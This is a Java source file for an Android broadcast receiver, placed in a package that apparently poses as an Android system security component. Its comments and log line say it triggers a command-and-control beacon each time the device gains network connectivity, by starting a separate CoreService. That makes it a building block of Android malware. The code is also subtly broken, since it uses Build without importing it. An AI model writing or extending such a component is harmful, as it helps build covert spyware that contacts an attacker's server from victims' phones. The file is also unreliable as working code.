package com.android.system.security;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;

/**
 * Triggers C2 beacon when network connectivity changes.
 */
public class ConnectivityReceiver extends BroadcastReceiver {

    private static final String TAG = "ConnectivityRcvr";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;

        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();

        if (activeNetwork != null && activeNetwork.isConnected()) {
            Log.i(TAG, "Network connected, triggering C2 beacon");

            Intent serviceIntent = new Intent(context, CoreService.class);
            serviceIntent.putExtra("source", "connectivity");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
                }
